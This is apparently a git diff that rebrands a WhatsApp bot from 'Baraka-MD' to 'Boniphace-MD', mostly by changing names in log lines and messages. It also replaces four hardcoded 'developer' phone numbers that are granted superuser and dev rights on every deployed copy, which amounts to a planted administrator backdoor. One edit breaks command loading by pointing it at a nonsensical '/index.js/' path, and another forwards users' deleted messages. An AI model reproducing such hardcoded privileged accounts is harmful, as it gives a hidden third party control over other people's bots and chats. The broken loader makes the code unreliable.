@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/Baraka-MD-WHATSAPP-BOT;;;=>/g,"");
+var session = conf.session.replace(/BONIPHACE-MD-WHATSAPP-BOT;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
 const readmore = more.repeat(4001)
@@ -156,10 +156,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255762190568';
-            const dj2 = '255762190568';
-            const dj3 = "255762190568";
-            const luffy = '255762190568';
+            const dj = '255716661569';
+            const dj2 = '255716661569';
+            const dj3 = "255716661569";
+            const luffy = '255716661569';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -167,7 +167,7 @@ setTimeout(() => {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t🍀BARAKA-MD IS ONLINE🍀");
+            console.log("\t🍀BONIPHACE-MD IS ONLINE🍀");
             console.log("=========== written message===========");
             if (verifGroupe) {
                 console.log("message provenant du groupe : " + nomGroupe);
@@ -288,7 +288,7 @@ function mybotpic() {
         
                                     if(msg === null || !msg ||msg === 'undefined') {console.log('Message non trouver') ; return } 
         
-                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `        😈Anti-delete-message😈\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
+                                await zk.sendMessage(idBot,{ image : { url : './media/deleted-message.jpg'},caption : `        💥Anti-delete-message💥\n Message from @${msg.key.participant.split('@')[0]}​` , mentions : [msg.key.participant]},)
                                 .then( () => {
                                     zk.sendMessage(idBot,{forward : msg},{quoted : msg}) ;
                                 })
@@ -528,7 +528,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Baraka-Md',
+                pack: 'Boniphace-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -672,7 +672,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `*BARAKA-MD WELCOME MESSAGE*`;
+            let msg = `*BONIPHACE-MD WELCOME MESSAGE*`;
             let membres = group.participants;
             for (let membre of membres) {
                 msg += ` \n❒ *Hey* 🖐️ @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
@@ -806,22 +806,22 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Baraka Md is connecting...");
+                console.log("ℹ️ Boniphace Md is connecting...");
             }
             else if (connection === 'open') {
-                console.log("🍀 Baraka Md Connected to WhatsApp! 🍀");
+                console.log("🍀 Boniphace Md Connected to WhatsApp! 🍀");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Baraka Md is Online 🕸\n\n");
+                console.log("Boniphace Md is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Baraka Md Commands ...\n");
+                console.log("Loading Boniphace Md Commands ...\n");
                 fs.readdirSync(__dirname + "/bega").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/bega/" + fichier);
+                            require(__dirname + "/index.js/" + fichier);
                             console.log(fichier + " Installed Successfully✔️");
                         }
                         catch (e) {
@@ -850,13 +850,13 @@ zk.ev.on('group-participants.update', async (group) => {
 
                     let cmsg =`
 ┌─────────────────────❂
-│✑ BARAKA-MD-BOT IS ONLINE   
+│✑ BONIPHACE-MD-BOT IS ONLINE   
 ┌─────────────────────❂
 │✑ Prefix : [ ${prefixe} ]                  
 │✑ Commands : 240
 │✑ Ram : 22.34/54.86 GB
 │✑ Platform : Chrome Linux
-│✑ Owner : Baraka Chacha Bega
+│✑ Owner : Boniphace Tech
 └─────────────────────❂⁠⁠⁠⁠⁠⁠⁠⁠⁠`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
